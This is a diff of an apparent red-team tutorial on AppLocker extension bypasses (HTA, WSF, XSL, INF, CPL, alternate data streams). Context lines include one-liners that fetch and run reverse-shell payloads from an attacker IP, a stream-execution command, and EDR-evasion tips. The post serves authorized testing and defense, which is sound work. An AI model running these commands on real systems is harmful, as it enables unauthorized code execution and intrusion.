@@ -1,11 +1,59 @@
 ---
 title: "AppLocker Bypass: File Extension Blind Spots"
-date: 2026-03-06
-description: "Six extension-based AppLocker bypass vectors — HTA via mshta, WSF via wscript, XSL via wmic, INF via cmstp, CPL via control.exe, and NTFS alternate data streams — with payloads and a Python C2 server."
+date: 2026-05-24
+weight: 1
+reading_path: "applocker"
+step: 1
+description: "Six extension-based AppLocker bypasses: HTA via mshta, WSF via wscript, XSL via wmic, INF via cmstp, CPL via control.exe, and NTFS alternate data streams."
+verified: "Windows 10/11 Enterprise · May 2026"
 tags: ["applocker", "bypass", "hta", "wsf", "xsl", "ads", "lolbins", "evasion", "windows", "blueteam"]
 ---
 
 > **Scope:** Red team / authorized penetration testing. Techniques map to MITRE ATT&CK [T1218.005](https://attack.mitre.org/techniques/T1218/005/) (Mshta), [T1220](https://attack.mitre.org/techniques/T1220/) (XSL Script Processing), [T1564.004](https://attack.mitre.org/techniques/T1564/004/) (ADS), [T1218.011](https://attack.mitre.org/techniques/T1218/011/) (Rundll32/CPL), and [T1218](https://attack.mitre.org/techniques/T1218/) (System Binary Proxy Execution).
+
+---
+
+## Which File Extensions Does AppLocker Miss?
+
+AppLocker operates on rules. Rules target specific file types. And here's the thing: AppLocker's default ruleset only covers a handful of them:
+
+| rule category | extensions covered |
+|--------------|-------------------|
+| Executable Rules | `.exe`, `.com` |
+| Script Rules | `.ps1`, `.vbs`, `.js`, `.cmd`, `.bat` |
+| Windows Installer Rules | `.msi`, `.msp`, `.mst` |
+| DLL Rules | `.dll`, `.ocx` (disabled by default) |
+| Packaged App Rules | `.appx` |
+
+That's it. Windows recognizes dozens of other file types that can execute code, and AppLocker has never heard of most of them. Anything outside that list is evaluated against no rule, which in most configurations means it runs freely.
+
+This post covers six independent extension-based bypass vectors, each with working payloads:
+
+| vector | extension | binary abused | noise |
+|--------|-----------|--------------|-------|
+| HTML Application | `.hta` | `mshta.exe` | medium |
+| Windows Script File | `.wsf` | `wscript.exe` / `cscript.exe` | low |
+| XSL Stylesheet | `.xsl` | `wmic.exe` | low |
+| Setup Info File | `.inf` | `cmstp.exe` | low |
+| Control Panel Applet | `.cpl` | `control.exe` | low |
+| NTFS Alternate Data Stream | (any) | any whitelisted binary | very low |
+
+---
+
+## AppLocker Extension Coverage Map
+AppLocker evaluates the file extension and publisher at process launch. Anything outside the covered column is invisible to policy:
+
+| Covered by default rules | Not covered (bypass surface) |
+|---|---|
+| `.exe` `.com` | `.hta` → `mshta.exe` (§1) |
+| `.ps1` `.vbs` | `.wsf` → `wscript.exe` (§2) |
+| `.js` `.cmd` `.bat` | `.wsc` → `wscript.exe` |
+| `.msi` `.msp` `.mst` | `.xsl` → `wmic.exe` (§3) |
+| `.dll` `.ocx` (DLL rules off) | `.inf` → `cmstp.exe` (§4) |
+| `.appx` | `.cpl` → `control.exe` (§5) |
+| | `.sct` → `regsvr32.exe` |
+| | `.url` `.lnk` `.gadget` |
+| | ADS → any extension (§6) |
 
 ---
 
@@ -88,117 +136,32 @@ VM → Snapshot → "FILEEXT_BASELINE"
 
 ---
 
-## AppLocker Extension Coverage Map
+## Execution Chain: Key Vectors
 
-``` {linenos=inline}
-┌─────────────────────────────────────────────────────────────────────┐
-│              APPLOCKER DEFAULT RULE COVERAGE                        │
-├───────────────────────┬─────────────────────────────────────────────┤
-│   ✓ COVERED           │   ✗ NOT COVERED (bypass surface)           │
-├───────────────────────┼─────────────────────────────────────────────┤
-│  .exe   .com          │  .hta   ← mshta.exe     (this blog §1)     │
-│  .ps1   .vbs          │  .wsf   ← wscript.exe   (this blog §2)     │
-│  .js    .cmd   .bat   │  .wsc   ← wscript.exe                      │
-│  .msi   .msp   .mst   │  .xsl   ← wmic.exe      (this blog §3)     │
-│  .dll   .ocx          │  .inf   ← cmstp.exe     (this blog §4)     │
-│  (DLL rules off)      │  .cpl   ← control.exe   (this blog §5)     │
-│  .appx                │  .sct   ← regsvr32.exe                     │
-│                       │  .url   .lnk   .gadget                     │
-│                       │  ADS    ← any extension  (this blog §6)    │
-└───────────────────────┴─────────────────────────────────────────────┘
-  AppLocker evaluates file extension + publisher at process launch.
-  Anything outside the left column is invisible to AppLocker policy.
+Every vector runs a signed Microsoft binary that then loads unevaluated content. Three representative chains:
+
+```mermaid
+graph TD
+    subgraph HTA["Vector 1 — HTA"]
+        A1["mshta.exe payload.hta\nmshta signed → ALLOW, .hta content never checked"] --> A2["IE engine parses HTA,\nJScript runs with full WScript.Shell access"] --> A3["Reverse shell / shellcode"]
+    end
+    subgraph XSL["Vector 3 — XSL via WMIC"]
+        B1["wmic process get /format:http://.../payload.xsl\nwmic signed → ALLOW"] --> B2["MSXML parses ms:script JScript,\nno AppLocker check of the XSL"] --> B3["Command / reverse shell"]
+    end
+    subgraph ADS["Vector 6 — NTFS ADS"]
+        C1["legit.txt:payload.ps1\nAppLocker sees legit.txt, blind to the stream"] --> C2["powershell -f legit.txt:payload.ps1"] --> C3["Payload executes, AppLocker never knew"]
+    end
 ```
 
 ---
 
-## Execution Chain — Key Vectors
-
-``` {linenos=inline}
-VECTOR 1: HTA (HTML Application)
-─────────────────────────────────────────────────────────────────
-  mshta.exe  payload.hta
-       │
-       │  AppLocker: ✓ mshta.exe signed Microsoft → ALLOW
-       │  AppLocker: never evaluates .hta content
-       │
-       ▼
-  Internet Explorer engine parses HTA
-       │
-       ▼
-  <script language="JScript"> runs
-  Full WScript.Shell access, no sandbox
-       │
-       └─► reverse shell / shellcode
-
-
-VECTOR 3: XSL via WMIC
-─────────────────────────────────────────────────────────────────
-  wmic.exe process get brief /format:"http://10.10.10.10/payload.xsl"
-       │
-       │  AppLocker: ✓ wmic.exe signed Microsoft → ALLOW
-       │
-       ▼
-  wmic fetches XSL via WinHTTP
-       │
-       ▼
-  MSXML parses <ms:script language="JScript">
-       │
-       ▼
-  Script executes — no AppLocker evaluation of XSL
-       │
-       └─► command / reverse shell
-
-
-VECTOR 6: NTFS Alternate Data Streams
-─────────────────────────────────────────────────────────────────
-  legit.txt              ← AppLocker evaluates THIS (primary stream)
-  legit.txt:payload.ps1  ← payload hidden in named stream
-       │
-       │  AppLocker sees:  legit.txt  (trusted path / not a script)
-       │  AppLocker BLIND: stream content
-       │
-  powershell -f legit.txt:payload.ps1
-       │
-       └─► payload executes, AppLocker never knew
-```
-
----
-
-## The Blind Spot
-
-AppLocker operates on rules. Rules target specific file types. And here's the thing: AppLocker's default ruleset only covers a handful of them:
-
-| rule category | extensions covered |
-|--------------|-------------------|
-| Executable Rules | `.exe`, `.com` |
-| Script Rules | `.ps1`, `.vbs`, `.js`, `.cmd`, `.bat` |
-| Windows Installer Rules | `.msi`, `.msp`, `.mst` |
-| DLL Rules | `.dll`, `.ocx` (disabled by default) |
-| Packaged App Rules | `.appx` |
-
-That's it. Windows recognizes dozens of other file types that can execute code, and AppLocker has never heard of most of them. Anything outside that list is evaluated against no rule, which in most configurations means it runs freely.
-
-This post covers six independent extension-based bypass vectors, each with working payloads:
-
-| vector | extension | binary abused | noise |
-|--------|-----------|--------------|-------|
-| HTML Application | `.hta` | `mshta.exe` | medium |
-| Windows Script File | `.wsf` | `wscript.exe` / `cscript.exe` | low |
-| XSL Stylesheet | `.xsl` | `wmic.exe` | low |
-| Setup Info File | `.inf` | `cmstp.exe` | low |
-| Control Panel Applet | `.cpl` | `control.exe` | low |
-| NTFS Alternate Data Stream | (any) | any whitelisted binary | very low |
-
----
-
-## Vector 1 — HTA (HTML Application)
+## Vector 1: HTA (HTML Application)
 
 `.hta` files are full-trust HTML Applications executed by `mshta.exe`, a signed Microsoft binary. They can run JScript and VBScript with **no browser sandbox**, **no zone restrictions**, and full access to the Windows Scripting Host object model.
 
 AppLocker Script Rules don't cover `.hta`. `mshta.exe` is trusted. The payload runs.
 
-### PoC — calc pop
+### PoC: calc pop
 
 ```html {linenos=inline}
 <!-- calc.hta -->
@@ -221,9 +184,9 @@ mshta.exe http://10.10.10.10/calc.hta
 
 ---
 
-### Reverse shell — HTA with rolling XOR shellcode loader
+### Reverse shell: HTA with rolling XOR shellcode loader
 
-Full reverse shell baked into a single `.hta`. The shellcode is XOR-encrypted (matching the rolling scheme from our runner) and fetched remotely, with no plaintext payload on wire.
+Full reverse shell baked into a single `.hta`. The [shellcode](/docs/applocker/process-injection/) is XOR-encrypted (matching the rolling scheme from our runner) and fetched remotely, with no plaintext payload on wire.
 
 ```html {linenos=inline}
 <!-- revshell.hta -->
@@ -350,7 +313,7 @@ mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run""mshta http://10.10.
 
 ---
 
-## Vector 2 — WSF (Windows Script File)
+## Vector 2: WSF (Windows Script File)
 
 `.wsf` is a Windows Script File, an XML wrapper that lets you mix JScript and VBScript in one file, reference external script libraries, and define multiple jobs. It's executed by `wscript.exe` and `cscript.exe`, both trusted binaries.
 
@@ -441,7 +404,7 @@ wscript //nologo \\10.10.10.10\share\revshell.wsf
 
 ---
 
-## Vector 3 — XSL via WMIC
+## Vector 3: XSL via WMIC
 
 `wmic.exe` has an undocumented `/format:` flag that accepts a URL to an XSL stylesheet. When it fetches the stylesheet, it processes the embedded JScript or VBScript transform, before AppLocker gets a look in.
 
@@ -554,7 +517,7 @@ wmic os get /format:"http://10.10.10.10/revshell.xsl"
 
 ---
 
-## Vector 4 — INF via CMSTP
+## Vector 4: INF via CMSTP
 
 `.inf` Setup Information Files are processed by several Windows components. `cmstp.exe`, the Microsoft Connection Manager Profile Installer, accepts an INF file and executes code defined in its `RunPreSetupCommandsSection`. It is signed, trusted, and completely off AppLocker's radar.
 
@@ -595,7 +558,7 @@ cmstp.exe /ni /au payload.inf
 
 ---
 
-## Vector 5 — CPL (Control Panel Applet)
+## Vector 5: CPL (Control Panel Applet)
 
 Control Panel Applets are DLLs with a `.cpl` extension. `control.exe` and `rundll32.exe` load and execute them. AppLocker's DLL rules are **disabled by default**. Even if enabled, a signed or path-whitelisted CPL will pass. An unsigned CPL in a user-writable path often runs freely.
 
@@ -708,7 +671,7 @@ rundll32.exe shell32.dll,Control_RunDLL payload.cpl
 
 ---
 
-## Vector 6 — NTFS Alternate Data Streams (ADS)
+## Vector 6: NTFS Alternate Data Streams (ADS)
 
 NTFS supports multiple named data streams on a single file. The primary stream is what you normally read and write. Additional named streams are invisible to Explorer, `dir`, and most AV scanners, but the Windows script engines can execute them directly.
 
@@ -901,10 +864,10 @@ python3 c2_server.py
 
 ## OpSec Notes
 
-- **HTA** — `mshta.exe` making network connections is a known red flag in most EDR products. HTTPS delivery and a clean domain reduce noise. The process hierarchy `explorer.exe → mshta.exe` is cleaner than spawning from Office macros.
-- **WSF** — `wscript.exe` is quieter than PowerShell but Script Block Logging doesn't apply, making it harder for defenders to reconstruct what ran.
+- **HTA** — `mshta.exe` making network connections is a known red flag in most [EDR](/docs/redteam/defender-bypass/) products. HTTPS delivery and a clean domain reduce noise. The process hierarchy `explorer.exe → mshta.exe` is cleaner than spawning from Office macros.
+- **WSF** — `wscript.exe` is quieter than PowerShell but Script Block Logging doesn't apply, making it harder for [defenders to reconstruct what ran](/docs/blueteam/lolbins-hunting/).
 - **WMIC + XSL** — `wmic.exe` making outbound HTTP is unusual and will trigger on mature stacks. Prefer UNC/SMB delivery if the target has no internet egress monitoring.
-- **CMSTP** — known bypass, Defender has behavioral detections. Pair with AMSI bypass if you're invoking PowerShell downstream.
+- **CMSTP** — known bypass, Defender has behavioral detections. Pair with [AMSI](/docs/redteam/bypass-amsi/) bypass if you're invoking PowerShell downstream.
 - **CPL** — unsigned CPL loaded by `rundll32.exe` is a Sysmon EID 7 event. Signing the DLL with any cert (even self-signed) changes the hash and often evades static signatures.
 - **ADS** — PowerShell executing from a stream path (`-f file.txt:stream`) is detectable via Script Block Logging. The stream plant itself is invisible to most scanners but Sysmon can be configured to log ADS creation.
 
